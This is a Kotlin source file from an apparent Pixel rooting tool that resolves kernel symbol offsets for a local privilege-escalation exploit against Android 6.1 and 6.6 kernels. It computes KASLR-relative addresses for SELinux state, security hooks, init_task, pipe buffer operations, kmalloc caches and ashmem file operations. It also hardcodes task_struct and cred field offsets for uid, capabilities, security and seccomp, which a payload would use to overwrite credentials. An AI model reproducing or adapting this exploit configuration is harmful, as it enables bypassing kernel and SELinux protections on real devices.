package com.alex193a.rootmypixel.core.kallsyms

import com.alex193a.rootmypixel.domain.model.TargetConfig

/** Maps kallsyms symbol offsets onto a [TargetConfig] for the matching KMI. */
object SymbolResolver {
    val requiredSymbols = setOf(
        "init_task", "root_task_group", "selinux_enforcing", "selinux_blob_sizes",
        "security_hook_heads", "kmalloc_caches", "anon_pipe_buf_ops",
        "call_usermodehelper_exec_work", "system_unbound_wq", "ashmem_ioctl",
        "ashmem_mmap", "ashmem_open", "ashmem_release", "ashmem_show_fdinfo",
        "configfs_read_iter", "configfs_bin_write_iter", "copy_splice_read", "noop_llseek",
        // static / unexported symbols — resolved by delta anchoring below
        "nfulnl_logger", "sysctl_bootid", "loggers", "ashmem_fops", "ashmem_misc_fops",
        // 6.1 has no copy_splice_read; its generic_file_splice_read fills the slot
        "generic_file_splice_read", "compat_ashmem_ioctl",
    )

    fun toConfig(kernelRelease: String, symbols: Map<String, Long>): TargetConfig {
        val family = when {
            kernelRelease.contains("6.1") -> 61
            kernelRelease.contains("6.6") -> 66
            else -> throw IllegalArgumentException("Unsupported kernel family: $kernelRelease")
        }
        val base = if (family == 61) 0xffffffc008000000UL.toLong() else 0xffffffc080000000UL.toLong()

        // kallsyms addresses are absolute (or already relative); normalize to
        // image-relative offsets so the payload can add its own slide.
        fun off(name: String): Long {
            val addr = symbols[name] ?: 0L
            return if (addr >= base) addr - base else addr
        }

        // Delta anchoring for static symbols: they sit at a constant distance
        // from an exported neighbour in the same translation unit. Deltas are
        // measured from the reference build of each KMI (tegu / frankel).
        val ioctl = off("ashmem_ioctl")
        val open = off("ashmem_open")
        val fops = off("ashmem_fops").takeIf { it != 0L }
            ?: if (ioctl != 0L) ioctl + if (family == 61) 0x647e28L else 0x669bb8L
            else if (open != 0L) open + if (family == 61) 0x647278L else 0x669288L
            else 0L
        val miscFops = off("ashmem_misc_fops").takeIf { it != 0L }
            ?: if (ioctl != 0L) ioctl + if (family == 61) 0x1543e58L else 0x15fec60L
            else if (open != 0L) open + if (family == 61) 0x15432a8L else 0x15fe330L
            else 0L

        val nfulnl = off("nfulnl_logger")
        val loggers = off("loggers").takeIf { it != 0L } ?: if (nfulnl != 0L) nfulnl - 0xb0L else 0L
        val sysctlBootid = off("sysctl_bootid")
        val randomBootIdData = off("sysctl_bootid").takeIf { it != 0L }
            ?: if (sysctlBootid != 0L) sysctlBootid - if (family == 61) 0x143790L else 0x141e70L else 0L

        val slideInitTask = off("slide_init_task").takeIf { it != 0L } ?: off("init_task")
        val slideRootTaskGroup = off("slide_root_task_group").takeIf { it != 0L } ?: off("root_task_group")

        val config = TargetConfig(
            kernelFamily = family,
            pageSize = 4096,
            kimageTextBase = base,
            p0PageOffset = 0xffffff8000000000UL.toLong(),
            p0PhysOffset = 0x80000000L,
            directMapBase = 0xffffff8000000000UL.toLong(),
            directMapEnd = 0xffffff9000000000UL.toLong(),
            vmemmapStart = 0xfffffffe00000000UL.toLong(),
            mmStructSize = if (family == 61) 0x400 else 0x500,
            kmallocCgroupType = if (family == 61) 1 else 2,
            kmallocCacheTypes = if (family == 61) 3 else 4,
            kmallocPipeIndex = 11,
            symbols = mapOf(
                "ashmem_ioctl" to ioctl,
                "ashmem_mmap" to off("ashmem_mmap"),
                "ashmem_open" to open,
                "ashmem_release" to off("ashmem_release"),
                "ashmem_show_fdinfo" to off("ashmem_show_fdinfo"),
                "ashmem_misc_fops" to miscFops,
                "ashmem_fops" to fops,
                "ashmem_compat_ioctl" to off("compat_ashmem_ioctl"),
                "configfs_read_iter" to off("configfs_read_iter"),
                "configfs_bin_write_iter" to off("configfs_bin_write_iter"),
                "copy_splice_read" to (off("copy_splice_read").takeIf { it != 0L }
                    ?: off("generic_file_splice_read")),
                "noop_llseek" to off("noop_llseek"),
                "init_task" to off("init_task"),
                "root_task_group" to off("root_task_group"),
                "selinux_enforcing" to off("selinux_enforcing"),
                "selinux_blob_sizes" to off("selinux_blob_sizes"),
                "security_hook_heads" to off("security_hook_heads"),
                "kmalloc_caches" to off("kmalloc_caches"),
                "anon_pipe_buf_ops" to off("anon_pipe_buf_ops"),
                "call_usermodehelper_exec_work" to off("call_usermodehelper_exec_work"),
                "system_unbound_wq" to off("system_unbound_wq"),
                "slide_nfulnl_logger" to nfulnl,
                "slide_loggers_0_1" to loggers,
                "slide_random_boot_id_data" to randomBootIdData,
                "slide_init_task" to slideInitTask,
                "slide_root_task_group" to slideRootTaskGroup,
                "slide_sysctl_bootid" to sysctlBootid,
            ),
            layouts = defaultLayouts(family),
        )
        config.validate()
        return config
    }

    /** KMI-stable DWARF/BTF defaults for task_struct + cred field offsets. */
    private fun defaultLayouts(family: Int): Map<String, Int> = if (family == 61) mapOf(
        "task_pid" to 0x630, "task_tgid" to 0x634, "task_real_parent" to 0x640,
        "task_real_cred" to 0x830, "task_cred" to 0x838, "task_comm" to 0x848,
        "task_tasks" to 0x550, "task_thread_info_flags" to 0, "task_seccomp" to 0x900,
        "task_atomic_flags" to 0x5f0, "cred_uid" to 4, "cred_securebits" to 36,
        "cred_caps" to 40, "cred_security" to 120,
    ) else mapOf(
        "task_pid" to 0x618, "task_tgid" to 0x61c, "task_real_parent" to 0x628,
        "task_real_cred" to 0x818, "task_cred" to 0x820, "task_comm" to 0x830,
        "task_tasks" to 0x550, "task_thread_info_flags" to 0, "task_seccomp" to 0x8e8,
        "task_atomic_flags" to 0x5d8, "cred_uid" to 8, "cred_securebits" to 40,
        "cred_caps" to 48, "cred_security" to 128,
    )
}
